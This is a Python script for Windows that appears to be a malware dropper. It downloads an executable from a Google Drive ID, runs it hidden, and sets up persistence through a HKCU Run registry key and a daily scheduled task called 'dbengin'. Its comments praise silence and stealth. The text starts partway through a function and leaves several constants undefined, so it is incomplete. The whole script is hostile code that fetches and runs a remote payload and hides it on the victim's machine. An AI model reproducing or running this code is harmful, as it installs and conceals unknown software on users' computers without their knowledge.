import subprocess
import sys
import os
import time
import winreg
from pathlib import Path
    # Ensure logs directory exists and capture output for debugging.
    try:
        os.makedirs("logs", exist_ok=True)
        log_path = os.path.join("logs", "download.log")
        with open(log_path, "a", buffering=1) as logf:
            logf.write(f"\n--- START {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
            proc = subprocess.Popen(
                cmd,
                creationflags=creationflags,
                stdout=logf,
                stderr=logf,
                stdin=subprocess.DEVNULL,
                close_fds=True,
            )
            logf.write(f"Started PID={proc.pid}\n")
    except Exception as exc:
        # Record failure to start in the log if possible
        try:
            os.makedirs("logs", exist_ok=True)
            with open(os.path.join("logs", "download.log"), "a") as logf:
                logf.write(f"Failed to launch: {exc}\n")
        except Exception:
            pass
        return subprocess.run(cmd, creationflags=creationflags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        return subprocess.Popen(cmd, creationflags=creationflags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

def set_autorun_registry(exe_path: Path):
    """Add the executable to HKCU\Software\Microsoft\Windows\CurrentVersion\Run."""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "UserAppStartup", 0, winreg.REG_SZ, str(exe_path))
    except Exception:
        pass  # silent

def create_scheduled_task(exe_path: Path):
    """Create a daily scheduled task (non‑elevated) for persistence."""
    task_name = "dbengin"
    trigger_time = "09:00"  # daily at 9 AM
    ps_script = f"""
    $taskName = "{task_name}"
    $action = New-ScheduledTaskAction -Execute "{exe_path}"
    $trigger = New-ScheduledTaskTrigger -Daily -At "{trigger_time}"
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
    """
    cmd = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
    run_hidden(cmd, wait=True)

def ensure_persistence():
    """Locate the final .exe and set up persistence (registry + scheduled task)."""
    # Wait a bit for the exe to finish self‑moving
    final_path = None
    for _ in range(10):  # up to 10 seconds
        if FINAL_EXE_LOCAL.exists():
            final_path = FINAL_EXE_LOCAL
            break
        if FINAL_EXE_ROAMING.exists():
            final_path = FINAL_EXE_ROAMING
            break
        time.sleep(1)

    # If still missing, manually move the downloaded file into place
    downloaded = Path(OUTPUT_NAME)
    if not final_path and downloaded.exists():
        try:
            FINAL_EXE_LOCAL.parent.mkdir(parents=True, exist_ok=True)
            downloaded.rename(FINAL_EXE_LOCAL)
            final_path = FINAL_EXE_LOCAL
        except Exception:
            pass

    if final_path and final_path.exists():
        # 1. Registry autorun (HKCU Run)
        set_autorun_registry(final_path)

        # 2. Scheduled task (optional, but adds stealth)
        create_scheduled_task(final_path)

def main():
    if sys.platform != "win32":
        return

    url = f"https://drive.google.com/uc?id={GDOWN_DRIVE_ID}"
    cmd = [sys.executable, "-m", "gdown", url, "-O", OUTPUT_NAME]

    # Step 1: Download (wait for completion)
    try:
        run_hidden(cmd, wait=True)
    except Exception:
        return

    # Step 2: Run the downloaded exe (wait for it to finish)
    exe_path = Path(OUTPUT_NAME)
    if not exe_path.exists():
        return
    try:
        run_hidden([str(exe_path)], wait=True)
    except Exception:
        pass

    # Step 3: Set up persistence
    ensure_persistence()

if __name__ == "__main__":
    main()